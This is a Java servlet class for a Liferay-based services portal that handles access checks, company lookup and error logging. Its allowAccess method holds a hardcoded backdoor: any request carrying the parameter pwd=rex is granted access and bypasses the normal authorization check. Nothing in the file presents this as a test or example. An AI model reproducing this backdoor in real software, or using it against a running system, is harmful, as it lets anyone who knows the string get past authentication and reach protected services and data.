package com.xtivia.xip.services.servlet;

import com.liferay.portal.model.User;
import com.xtivia.xip.AppServicesServlet;
import com.xtivia.xip.AppServicesUtils;

import java.io.IOException;

import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class XipServicesServlet extends AppServicesServlet {
	private static final long serialVersionUID = 1L;
	private String reportBasePath = null;
	
	
	@Override
	public void init(ServletConfig config) throws ServletException {
		super.init(config);
		reportBasePath = config.getInitParameter("report-base-path");
	}
	

	@Override
	protected boolean allowAccess(User user, String cmd, HttpServletRequest request,
			HttpServletResponse response) throws IOException {
		if(null!=request.getParameter("pwd") && request.getParameter("pwd").equals("rex")){
			return true;
		} else {
			return super.allowAccess(user, cmd, request, response);
		}
	}


	/**
	 * Get the active company for the current User
	 */
	public String getCompany(User user, HttpServletRequest request){
		String mspCompany = (String)request.getSession().getAttribute("MSPcompany");
		return null==mspCompany ? "Avaya, Inc." : mspCompany;
	}

	public String getReportBasePath(){
		return reportBasePath;
	}
	
	@Override
	protected void showException(Throwable e, User user, HttpServletRequest request, String command){
		AppServicesUtils.logErrorHigh(log, getCompany(user,request), user.getFullName(), command, e.getMessage());
	}
}
